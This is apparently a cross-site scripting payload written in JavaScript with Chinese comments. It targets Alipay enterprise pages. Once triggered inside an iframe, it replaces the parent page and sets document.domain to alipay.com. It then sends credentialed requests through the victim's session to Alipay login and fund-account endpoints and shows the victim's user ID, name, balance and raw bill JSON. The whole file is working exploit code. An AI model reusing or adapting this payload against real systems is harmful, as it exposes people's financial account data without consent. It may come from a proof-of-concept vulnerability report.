(function() {
    // 获取父窗口
    var parentWin = window.parent || parent;
    var parentDoc = parentWin.document;
    
    // 日志函数 - 输出到父窗口
    function addLog(message, type) {
        // 先输出到控制台，确保能看到
        console.log('[' + (type || 'info') + '] ' + message);
        
        try {
            // 确保能访问父窗口
            if (!parentDoc || !parentWin) {
                console.warn('无法访问父窗口，跳过日志输出');
                return;
            }
            
            var logContainer = parentDoc.getElementById('logContainer');
            if (!logContainer) {
                // 如果日志容器不存在，先创建UI
                try {
                    initParentUI();
                    logContainer = parentDoc.getElementById('logContainer');
                } catch(e) {
                    console.error('initParentUI 在 addLog 中失败:', e);
                    return;
                }
            }
            
            if (logContainer) {
                var logEntry = parentDoc.createElement('div');
                logEntry.className = 'log-entry ' + (type || 'info');
                var timestamp = new Date().toLocaleTimeString();
                var icon = type === 'error' ? '❌' : type === 'success' ? '✅' : type === 'warning' ? '⚠️' : '📝';
                logEntry.textContent = '[' + timestamp + '] ' + icon + ' ' + message;
                logContainer.appendChild(logEntry);
                logContainer.scrollTop = logContainer.scrollHeight;
            } else {
                console.warn('logContainer 不存在，无法添加日志');
            }
        } catch(e) {
            console.error('添加日志失败:', e);
            console.error('错误堆栈:', e.stack);
        }
    }
    
    // 初始化父窗口UI
    function initParentUI() {
        try {
            // 清空父窗口body
            parentDoc.body.innerHTML = '';
            parentDoc.body.style.cssText = 'margin: 0; padding: 20px; background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;';
            
            // 创建样式
            var style = parentDoc.createElement('style');
            style.textContent = `
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
                    padding: 20px;
                    margin: 0;
                    background: #f5f5f5;
                }
                .container {
                    max-width: 1200px;
                    margin: 0 auto;
                    background: white;
                    padding: 30px;
                    border-radius: 8px;
                    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
                }
                h1 {
                    color: #1677ff;
                    border-bottom: 3px solid #1677ff;
                    padding-bottom: 10px;
                    margin-bottom: 20px;
                }
                h2 {
                    color: #333;
                    margin-top: 30px;
                    margin-bottom: 15px;
                }
                .log-container {
                    background: #1f1f1f;
                    color: #0f0;
                    font-family: 'Courier New', monospace;
                    font-size: 12px;
                    padding: 15px;
                    border-radius: 8px;
                    margin-bottom: 20px;
                    max-height: 300px;
                    overflow-y: auto;
                    border: 2px solid #0f0;
                }
                .log-entry {
                    margin: 5px 0;
                    padding: 3px 0;
                    border-bottom: 1px solid #333;
                }
                .log-entry.error {
                    color: #f00;
                }
                .log-entry.success {
                    color: #0f0;
                }
                .log-entry.info {
                    color: #0ff;
                }
                .log-entry.warning {
                    color: #ff0;
                }
                .info-box {
                    margin: 20px 0;
                    padding: 15px;
                    border-radius: 8px;
                    border-left: 4px solid #1677ff;
                }
                .info-box.user {
                    background: #f0f5ff;
                }
                .info-box.balance {
                    background: #f6ffed;
                    border-left-color: #52c41a;
                }
                .info-box.error {
                    background: #fff2f0;
                    border-left-color: #ff4d4f;
                    color: #ff4d4f;
                }
                .loading {
                    color: #1677ff;
                }
                .balance-amount {
                    font-size: 32px;
                    font-weight: bold;
                    color: #52c41a;
                    margin: 10px 0;
                }
                textarea {
                    width: 100%;
                    height: 400px;
                    font-family: 'Courier New', monospace;
                    font-size: 12px;
                    padding: 10px;
                    border: 1px solid #d9d9d9;
                    border-radius: 4px;
                    resize: vertical;
                }
                code {
                    background: #f5f5f5;
                    padding: 2px 6px;
                    border-radius: 3px;
                    font-family: 'Courier New', monospace;
                }
                .meta-info {
                    background: #fafafa;
                    padding: 10px;
                    border-radius: 4px;
                    font-size: 12px;
                    color: #666;
                    margin-bottom: 20px;
                }
                .step-indicator {
                    background: #e6f7ff;
                    padding: 10px;
                    border-radius: 4px;
                    margin: 10px 0;
                    border-left: 4px solid #1677ff;
                }
            `;
            parentDoc.head.appendChild(style);
            
            // 创建容器
            var container = parentDoc.createElement('div');
            container.className = 'container';
            container.innerHTML = `
                <h1>🔐 支付宝账户信息查询</h1>
                <h2>📋 执行日志</h2>
                <div id="logContainer" class="log-container">
                    <div class="log-entry info">⏳ 初始化中...</div>
                </div>
                <div class="meta-info">
                    <strong>执行环境:</strong><br>
                    • Window Location: <code id="winLocation">检测中...</code><br>
                    • Document Domain: <code id="docDomain">检测中...</code><br>
                    • Origin: <code id="origin">检测中...</code><br>
                    • Referer: <code id="referer">检测中...</code>
                </div>
                <h2>👤 用户信息</h2>
                <div id="userInfo" class="info-box user loading">
                    <p>⏳ 等待开始...</p>
                </div>
                <h2>💰 账户余额</h2>
                <div id="balance" class="info-box balance loading">
                    <p>⏳ 等待用户信息加载完成...</p>
                </div>
                <h2>📄 完整JSON数据</h2>
                <textarea id="jsonData" placeholder="等待数据加载..." readonly></textarea>
            `;
            parentDoc.body.appendChild(container);
            
            addLog('父窗口UI初始化完成', 'success');
        } catch(e) {
            console.error('初始化父窗口UI失败:', e);
        }
    }
    
    // 使用fetch API发起请求（在javascript:协议下更可靠）
    function makeRequest(url, options, callback) {
        options = options || {};
        var method = options.method || 'GET';
        var data = options.data || null;
        var headers = options.headers || {};
        var withCredentials = options.withCredentials !== false;
        
        addLog('准备发送 ' + method + ' 请求到: ' + url, 'info');
        console.log('makeRequest 调用，method:', method, 'url:', url);
        
        try {
            // 构建请求配置
            var fetchOptions = {
                method: method,
                credentials: withCredentials ? 'include' : 'same-origin',
                headers: headers
            };
            
            // 处理请求体
            if (data) {
                if (method === 'GET' || method === 'HEAD') {
                    // GET请求，将参数拼接到URL
                    var params = [];
                    if (typeof data === 'object') {
                        for (var key in data) {
                            if (data.hasOwnProperty(key)) {
                                params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
                            }
                        }
                        var queryString = params.join('&');
                        if (queryString) {
                            url += (url.indexOf('?') === -1 ? '?' : '&') + queryString;
                        }
                    }
                } else {
                    // POST等请求，将数据放在body中
                    if (typeof data === 'object') {
                        var params = [];
                        for (var key in data) {
                            if (data.hasOwnProperty(key)) {
                                params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
                            }
                        }
                        fetchOptions.body = params.join('&');
                        if (!fetchOptions.headers['Content-Type']) {
                            fetchOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
                        }
                    } else {
                        fetchOptions.body = data;
                    }
                }
            }
            
            addLog('请求配置完成，开始发送...', 'info');
            console.log('fetch options:', fetchOptions);
            
            // 使用父窗口的fetch发送请求，确保Referer正确
            var fetchFn = parentWin.fetch || window.fetch;
            if (!fetchFn) {
                throw new Error('fetch API 不可用');
            }
            
            addLog('使用父窗口的fetch发送请求，Referer将自动设置为: ' + parentWin.location.href, 'info');
            console.log('使用fetch函数:', fetchFn === parentWin.fetch ? 'parentWin.fetch' : 'window.fetch');
            
            // 使用父窗口的fetch发送请求
            fetchFn.call(parentWin, url, fetchOptions)
                .then(function(response) {
                    console.log('fetch 响应收到，status:', response.status);
                    addLog('请求响应收到，状态码: ' + response.status, 'info');
                    
                    if (response.ok) {
                        return response.json().then(function(jsonData) {
                            addLog('请求成功，状态码: ' + response.status, 'success');
                            if (callback && callback.success) {
                                callback.success(jsonData, response);
                            }
                        }).catch(function(e) {
                            // 如果不是JSON，尝试获取文本
                            return response.text().then(function(text) {
                                addLog('响应不是JSON格式，尝试解析文本', 'warning');
                                try {
                                    var jsonData = JSON.parse(text);
                                    if (callback && callback.success) {
                                        callback.success(jsonData, response);
                                    }
                                } catch(e2) {
                                    addLog('解析响应失败: ' + e2.message, 'error');
                                    if (callback && callback.error) {
                                        callback.error(response, 'parse', e2.message);
                                    }
                                }
                            });
                        });
                    } else {
                        addLog('请求失败，状态码: ' + response.status, 'error');
                        return response.text().then(function(text) {
                            if (callback && callback.error) {
                                // 创建一个类似xhr的对象以保持兼容性
                                var fakeXhr = {
                                    status: response.status,
                                    statusText: response.statusText,
                                    responseText: text
                                };
                                callback.error(fakeXhr, 'http', 'HTTP ' + response.status);
                            }
                        }).catch(function(e) {
                            if (callback && callback.error) {
                                var fakeXhr = {
                                    status: response.status,
                                    statusText: response.statusText,
                                    responseText: ''
                                };
                                callback.error(fakeXhr, 'http', 'HTTP ' + response.status);
                            }
                        });
                    }
                })
                .catch(function(error) {
                    console.error('fetch 请求失败:', error);
                    addLog('请求发生错误: ' + error.message, 'error');
                    if (callback && callback.error) {
                        var fakeXhr = {
                            status: 0,
                            statusText: '',
                            responseText: ''
                        };
                        callback.error(fakeXhr, 'network', error.message);
                    }
                });
            
            addLog('请求已发送', 'info');
        } catch(e) {
            addLog('创建请求失败: ' + e.message, 'error');
            console.error('fetch 错误:', e);
            console.error('错误堆栈:', e.stack);
            if (callback && callback.error) {
                callback.error(null, 'exception', e.message);
            }
        }
    }
    
    // 初始化
    try {
        addLog('🚀 XSS触发，开始执行...', 'info');
        addLog('📍 当前在iframe中，所有操作将作用到父窗口', 'info');
        
        // 初始化父窗口UI
        try {
            initParentUI();
            addLog('✅ initParentUI 执行完成', 'success');
            console.log('✅ initParentUI 执行完成 (控制台)');
        } catch(e) {
            console.error('initParentUI 失败:', e);
            addLog('❌ initParentUI 失败: ' + e.message, 'error');
        }
        
        // 立即输出到控制台，确保能看到
        console.log('准备执行 setTimeout...');
        console.log('parentWin:', parentWin);
        console.log('parentDoc:', parentDoc);
        
        // 定义一个执行函数
        function executeNextStep() {
            console.log('executeNextStep 开始执行...');
            try {
                console.log('尝试调用 addLog...');
                addLog('⏳ 开始获取环境信息...', 'info');
                console.log('addLog 调用成功');
                    var winLocation = 'N/A';
            var docDomain = 'N/A';
            var origin = 'N/A';
            var referer = 'N/A';
            
            try {
                winLocation = parentWin.location.href;
                addLog('✅ 获取 window.location 成功', 'success');
            } catch(e) {
                addLog('❌ 获取 window.location 失败: ' + e.message, 'error');
                winLocation = '无法访问 (跨域限制)';
            }
            
            try {
                docDomain = parentDoc.domain || 'N/A';
                addLog('✅ 获取 document.domain 成功: ' + docDomain, 'success');
            } catch(e) {
                addLog('❌ 获取 document.domain 失败: ' + e.message, 'error');
            }
            
            try {
                origin = parentWin.location.origin || 'N/A';
                addLog('✅ 获取 window.origin 成功: ' + origin, 'success');
            } catch(e) {
                addLog('❌ 获取 window.origin 失败: ' + e.message, 'error');
                origin = '无法访问 (跨域限制)';
            }
            
            try {
                referer = parentDoc.referrer || 'N/A';
                addLog('✅ 获取 document.referrer 成功: ' + referer, 'success');
            } catch(e) {
                addLog('❌ 获取 document.referrer 失败: ' + e.message, 'error');
            }
            
            addLog('当前执行环境检测完成:', 'info');
            addLog('  - window.location: ' + winLocation, 'info');
            addLog('  - document.domain: ' + docDomain, 'info');
            addLog('  - window.origin: ' + origin, 'info');
            addLog('  - document.referrer: ' + referer, 'info');
            
            try {
                var winLocationEl = parentDoc.getElementById('winLocation');
                var docDomainEl = parentDoc.getElementById('docDomain');
                var originEl = parentDoc.getElementById('origin');
                var refererEl = parentDoc.getElementById('referer');
                if (winLocationEl) winLocationEl.textContent = winLocation;
                if (docDomainEl) docDomainEl.textContent = docDomain;
                if (originEl) originEl.textContent = origin;
                if (refererEl) refererEl.textContent = referer;
                addLog('✅ 环境信息已更新到页面', 'success');
            } catch(e) {
                addLog('❌ 更新环境信息到页面失败: ' + e.message, 'error');
            }
            
            // 设置document.domain（如果需要）
            try {
                parentDoc.domain = 'alipay.com';
                addLog('✅ document.domain 已设置为: alipay.com', 'success');
            } catch(e) {
                addLog('⚠️ 设置 document.domain 失败: ' + e.message, 'warning');
            }
            
                addLog('⏳ 准备执行主流程（使用原生XMLHttpRequest）...', 'info');
                console.log('准备执行主流程，检查main函数是否存在:', typeof main);
                
                // 直接执行主流程，不需要jQuery
                // 先立即尝试执行一次
                try {
                    console.log('立即尝试执行main()...');
                    addLog('⏳ 开始执行主流程...', 'info');
                    main();
                    console.log('main() 执行完成（无异常）');
                } catch(e) {
                    console.error('立即执行main()失败:', e);
                    console.error('错误堆栈:', e.stack);
                    addLog('❌ main() 执行失败: ' + e.message, 'error');
                    // 如果立即执行失败，延迟再试
                    setTimeout(function() {
                        try {
                            console.log('延迟执行main()...');
                            addLog('⏳ 延迟执行主流程...', 'info');
                            main();
                        } catch(e2) {
                            console.error('延迟执行main()也失败:', e2);
                            addLog('❌ 延迟执行main()也失败: ' + e2.message, 'error');
                        }
                    }, 500);
                }
            } catch(e) {
                console.error('executeNextStep 内部错误:', e);
                console.error('错误堆栈:', e.stack);
                console.error('setTimeout 内部错误:', e);
                console.error('错误堆栈:', e.stack);
                try {
                    addLog('❌ setTimeout 内部执行失败: ' + e.message, 'error');
                } catch(e2) {
                    console.error('连 addLog 都失败了:', e2);
                }
                // 即使出错也尝试继续
                try {
                    console.log('尝试继续执行 main()...');
                    setTimeout(function() {
                        try {
                            console.log('执行 main()...');
                            main();
                        } catch(e2) {
                            console.error('main() 错误:', e2);
                        }
                    }, 500);
                } catch(e3) {
                    console.error('执行 main() 错误:', e3);
                }
            }
        }
        
        // 立即尝试执行一次（不等待）
        try {
            console.log('立即尝试执行 executeNextStep...');
            executeNextStep();
        } catch(e) {
            console.error('立即执行失败:', e);
            // 如果立即执行失败，使用 setTimeout
            console.log('使用 setTimeout 延迟执行...');
            setTimeout(executeNextStep, 100);
        }
        
        // 添加一个备用方案，如果主流程没执行，用更长的延迟再试一次
        setTimeout(function() {
            console.log('备用 setTimeout 执行...');
            try {
                var logContainer = parentDoc.getElementById('logContainer');
                if (logContainer) {
                    var testEntry = parentDoc.createElement('div');
                    testEntry.className = 'log-entry warning';
                    testEntry.textContent = '[' + new Date().toLocaleTimeString() + '] ⚠️ 备用定时器执行，如果看到这条消息说明主流程可能有问题';
                    logContainer.appendChild(testEntry);
                    // 再次尝试执行
                    executeNextStep();
                }
            } catch(e) {
                console.error('备用定时器错误:', e);
            }
        }, 1000);
    } catch(e) {
        console.error('初始化失败:', e);
        try {
            addLog('❌ 初始化过程出错: ' + e.message, 'error');
            addLog('错误堆栈: ' + (e.stack ? e.stack.substring(0, 300) : 'N/A'), 'error');
        } catch(e2) {
            console.error('无法添加错误日志:', e2);
        }
    }
    
    // 主函数
    function main() {
        console.log('main() 函数开始执行');
        try {
            addLog('开始执行主流程', 'info');
            addLog('步骤1: 准备请求用户信息...', 'info');
            
            // 获取用户信息
            var userInfoUrl = 'https://enterpriseportal.alipay.com/pamir/login/queryLoginAccount.json';
            
            console.log('准备请求:', userInfoUrl);
            addLog('请求URL: ' + userInfoUrl, 'info');
            
            try {
                var parentLocation = parentWin.location.href;
                addLog('Referer将自动设置为父窗口URL: ' + parentLocation, 'info');
            } catch(e) {
                console.warn('无法获取parentWin.location:', e);
                addLog('⚠️ 无法获取父窗口URL: ' + e.message, 'warning');
            }
            
            try {
                var userInfoEl = parentDoc.getElementById('userInfo');
                if (userInfoEl) userInfoEl.innerHTML = '<div class="step-indicator">📡 正在请求用户信息...</div>';
            } catch(e) {
                console.warn('更新userInfo元素失败:', e);
            }
            
            // 使用原生XMLHttpRequest发送请求
            makeRequest(userInfoUrl, {
                method: 'GET',
                data: {
                    _output_charset: 'utf-8',
                    appScene: 'MRCH'
                },
                withCredentials: true
            }, {
                success: function(data) {
                    addLog('用户信息获取成功', 'success');
                    addLog('响应数据: ' + JSON.stringify(data), 'info');
                    
                    try {
                        var logonUserId = data.data.logonUserId;
                        var logonName = data.data.logonName;
                        
                        addLog('解析用户ID: ' + logonUserId, 'success');
                        addLog('解析用户名: ' + logonName, 'success');
                        
                        try {
                            var userInfoEl = parentDoc.getElementById('userInfo');
                            if (userInfoEl) {
                                userInfoEl.className = 'info-box user';
                                userInfoEl.innerHTML = '<div class="step-indicator">✅ 用户信息获取成功</div>' +
                                    '<p><strong>用户ID:</strong> <code>' + logonUserId + '</code></p>' +
                                    '<p><strong>用户名:</strong> ' + logonName + '</p>';
                            }
                        } catch(e) {}
                        
                        // 获取账户详情
                        getAccountDetail(logonUserId);
                    } catch(e) {
                        addLog('解析用户信息失败: ' + e.message, 'error');
                        try {
                            var userInfoEl = parentDoc.getElementById('userInfo');
                            if (userInfoEl) {
                                userInfoEl.className = 'info-box error';
                                userInfoEl.innerHTML = '<p><strong>❌ 解析失败:</strong> ' + e.message + '</p>';
                            }
                        } catch(e2) {}
                    }
                },
                error: function(xhr, status, error) {
                    addLog('获取用户信息失败', 'error');
                    addLog('错误信息: ' + error, 'error');
                    addLog('状态码: ' + (xhr ? xhr.status : 'N/A'), 'error');
                    addLog('响应内容: ' + (xhr && xhr.responseText ? xhr.responseText.substring(0, 200) : 'N/A'), 'error');
                    
                    try {
                        var userInfoEl = parentDoc.getElementById('userInfo');
                        if (userInfoEl) {
                            userInfoEl.className = 'info-box error';
                            userInfoEl.innerHTML = '<div class="step-indicator">❌ 获取失败</div>' +
                                '<p><strong>错误:</strong> ' + error + '</p>' +
                                '<p><strong>状态码:</strong> ' + (xhr ? xhr.status : 'N/A') + '</p>' +
                                '<p style="font-size: 12px;">可能原因: 未登录、Cookie过期、或CORS限制</p>';
                        }
                    } catch(e) {}
                }
            });
        } catch(e) {
            console.error('main() 函数内部错误:', e);
            console.error('错误堆栈:', e.stack);
            addLog('❌ main() 函数内部错误: ' + e.message, 'error');
        }
    }
    
    function getAccountDetail(logonUserId) {
        console.log('getAccountDetail() 开始执行, logonUserId:', logonUserId);
        addLog('步骤2: 准备请求账户详情...', 'info');
        
        // 从Cookie中获取ctoken
        var ctoken = 'ccc';
        addLog('使用ctoken: ' + ctoken, 'info');
        
        var accountUrl = 'https://mbillexprod.alipay.com/enterprise/fundAccountDetail.json';
        
        addLog('请求URL: ' + accountUrl, 'info');
        addLog('Referer将自动设置为父窗口URL: ' + parentWin.location.href, 'info');
        
        try {
            var balanceEl = parentDoc.getElementById('balance');
            if (balanceEl) balanceEl.innerHTML = '<div class="step-indicator">📡 正在请求账户余额...</div>';
        } catch(e) {}
        
        // 使用原生XMLHttpRequest发送请求
        addLog('发送请求前准备...', 'info');
        addLog('Referer将自动设置为: ' + parentWin.location.href, 'info');
        
        makeRequest(accountUrl, {
            method: 'POST',
            data: {
                billUserId: logonUserId,
                pageNum: 1,
                pageSize: 50,
                startDateInput: '2025-12-25 00:00:00',
                endDateInput: '2025-12-26 00:00:00',
                showType: 0,
                accountType: '',
                settleBillRadio: 1,
                queryEntrance: 1,
                querySettleAccount: false,
                switchToFrontEnd: true,
                ctoken: ctoken,
                _output_charset: 'utf-8',
                _input_charset: 'gbk'
            },
            withCredentials: true
        }, {
            success: function(response) {
                addLog('账户详情获取成功', 'success');
                addLog('响应数据长度: ' + JSON.stringify(response).length + ' 字符', 'info');
                
                try {
                    var balance = response.result.detail[0].balance;
                    
                    addLog('解析账户余额: ¥' + balance, 'success');
                    
                    try {
                        var balanceEl = parentDoc.getElementById('balance');
                        if (balanceEl) {
                            balanceEl.className = 'info-box balance';
                            balanceEl.innerHTML = '<div class="step-indicator">✅ 账户余额获取成功</div>' +
                                '<div class="balance-amount">¥ ' + balance + '</div>' +
                                '<p style="color: #666; font-size: 14px;">查询时间: ' + new Date().toLocaleString() + '</p>';
                        }
                        var jsonDataEl = parentDoc.getElementById('jsonData');
                        if (jsonDataEl) jsonDataEl.value = JSON.stringify(response, null, 2);
                    } catch(e) {}
                    
                    addLog('完整JSON数据已显示在文本框中', 'success');
                    addLog('所有请求完成！', 'success');
                } catch(e) {
                    addLog('解析账户详情失败: ' + e.message, 'error');
                    addLog('错误堆栈: ' + (e.stack ? e.stack.substring(0, 200) : 'N/A'), 'error');
                    try {
                        var balanceEl = parentDoc.getElementById('balance');
                        if (balanceEl) {
                            balanceEl.className = 'info-box error';
                            balanceEl.innerHTML = '<div class="step-indicator">❌ 解析失败</div>' +
                                '<p><strong>错误:</strong> ' + e.message + '</p>';
                        }
                        var jsonDataEl = parentDoc.getElementById('jsonData');
                        if (jsonDataEl) jsonDataEl.value = JSON.stringify(response, null, 2);
                    } catch(e2) {}
                }
            },
            error: function(xhr, status, error) {
                addLog('获取账户详情失败', 'error');
                addLog('错误信息: ' + error, 'error');
                addLog('状态码: ' + (xhr ? xhr.status : 'N/A'), 'error');
                addLog('响应内容: ' + (xhr && xhr.responseText ? xhr.responseText.substring(0, 200) : 'N/A'), 'error');
                
                try {
                    var balanceEl = parentDoc.getElementById('balance');
                    if (balanceEl) {
                        balanceEl.className = 'info-box error';
                        balanceEl.innerHTML = '<div class="step-indicator">❌ 获取失败</div>' +
                            '<p><strong>错误:</strong> ' + error + '</p>' +
                            '<p><strong>状态码:</strong> ' + (xhr ? xhr.status : 'N/A') + '</p>' +
                            '<p style="font-size: 12px;">可能原因: ctoken无效、未登录、或CORS限制</p>';
                    }
                } catch(e) {}
            }
        });
    }
})();

